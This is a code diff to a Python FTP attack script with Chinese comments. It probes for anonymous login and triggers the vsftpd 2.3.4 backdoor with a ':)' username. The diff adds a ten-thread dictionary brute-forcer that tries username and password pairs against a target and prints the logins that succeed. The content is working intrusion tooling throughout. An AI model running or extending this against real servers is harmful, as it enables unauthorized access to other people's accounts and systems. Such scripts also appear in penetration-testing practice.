@@ -1,6 +1,9 @@
 import ftplib
 from optparse import OptionParser
 import time
+import threading
+from queue import Queue
+import sys
 import socket as s
 
 # 进行匿名登录
@@ -8,7 +11,7 @@ def anonLogin(target,port):
     try:
         ftp = ftplib.FTP()
         ftp.connect(target,port)
-        ftp.login('anonymous','abcd')
+        ftp.login('anonymous'.strip(),'abcd'.strip())
         print('[+] %s:%d : anonymous login successful'%(target,port))
         ftp.quit()
     except :
@@ -16,26 +19,62 @@ def anonLogin(target,port):
 
 # 进行爆破登录
 def blastLogin(target,port,file):
+    global flag # 标志是否爆破成功
+
+    # 多线程爆破
+    class thead(threading.Thread):
+        def __init__(self,queue,total):
+            threading.Thread.__init__(self)
+            self.queue = queue
+            self.total = total
+
+        def run(self):
+            global flag
+            while not self.queue.empty():
+                user = self.queue.get()
+                threading.Thread(target=self.progress_bar).start()
+                try:
+                    ftp = ftplib.FTP()
+                    ftp.connect(target,port)
+                    ftp.login(user.split(' ')[0].strip(),user.split(' ')[-1].strip())
+                    sys.stdout.write('\r'+' '*20)
+                    sys.stdout.write('\r[+] %s:%d : %s %s login successful\n'%(target,port,user.split(' ')[0].strip(),user.split(' ')[-1].strip()))
+                    sys.stdout.flush()
+                    flag = True
+                    ftp.quit()
+                except:
+                    pass
+
+        def progress_bar(self):
+            sys.stdout.write(' '*20)
+            per = 100-float(self.queue.qsize())/float(self.total)*100
+            msg = '%s Left [%s All] Scan in %1.1f%%'%(self.queue.qsize(),self.total,per)
+            sys.stdout.write('\r'+'[#]'+msg)
+            sys.stdout.flush()
+            if int(self.queue.qsize()) == 0:
+                print()
+    
     # 得到用于爆破的用户名和密码
     f = open(file,'r')
     users = f.readlines()
     f.close()
 
-    flag = False # 标志是否存在爆破成功
+    queue = Queue()
 
-    # 进行爆破
     for user in users:
-        user = user.rstrip('\n')
-        time.sleep(0.2)
-        try:
-            ftp = ftplib.FTP()
-            ftp.connect(target,port)
-            ftp.login(user.split(' ')[0],user.split(' ')[-1])
-            print('[+] %s:%d : %s %s login successful'%(target,port,user.split(' ')[0],user.split(' ')[-1]))
-            flag = True
-            ftp.quit()
-        except :
-            pass
+        user.strip('\n')
+        queue.put(user)
+
+    total = queue.qsize()
+    theads = []
+    theadnum = 10 # 线程数
+
+    for _ in range(theadnum):
+        theads.append(thead(queue,total))
+    for t in theads:
+        t.start()
+    for t in theads:
+        t.join()
     
     # 未爆破成功
     if not flag:
@@ -45,9 +84,8 @@ def blastLogin(target,port,file):
 def vsftpd_234(target,port):
     try:
         ftp = ftplib.FTP()
-        ftp.set_debuglevel(1)
-        ftp.connect(target,port)
-        ftp.login('user:)','pass')
+        ftp.connect(target,port,timeout=5)
+        ftp.login('user:)'.strip(),'pass'.strip())
         ftp.quit()
     except:
         print('[*] use user:) to open the backdoor')
@@ -100,7 +138,8 @@ if __name__ == "__main__":
         print('\n[*] Test the vsftpd_234_backdoor')
         vsftpd_234(options.target,options.port)
         if options.file:
-            print('\n[*] Try to blast login\n')
+            flag = False
+            print('\n[*] Try to blast login')
             blastLogin(options.target,options.port,options.file)
         else:
             print('\n[-] No dictionary, does not try blast login')
